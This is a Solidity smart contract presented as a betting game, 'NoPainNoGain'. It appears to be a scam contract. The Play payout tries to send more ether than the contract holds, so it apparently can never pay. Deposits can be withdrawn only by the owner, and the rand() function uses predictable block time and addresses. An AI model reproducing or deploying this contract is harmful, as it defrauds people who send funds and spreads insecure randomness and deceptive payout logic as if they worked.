pragma solidity ^0.4.19;
contract NoPainNoGain {
address private Owner = msg.sender;
function NoPainNoGain() public payable {}
function() public payable {}
function Withdraw() public {
require(msg.sender == Owner);
Owner.transfer(this.balance);
}
function Play(uint n) public payable {
if(rand(msg.sender) * n < rand(Owner) && msg.value >= this.balance && msg.value > 0.25 ether)
msg.sender.transfer(this.balance+msg.value);
}
function rand(address a) private view returns(uint) {
return uint(keccak256(uint(a) + now));
}
}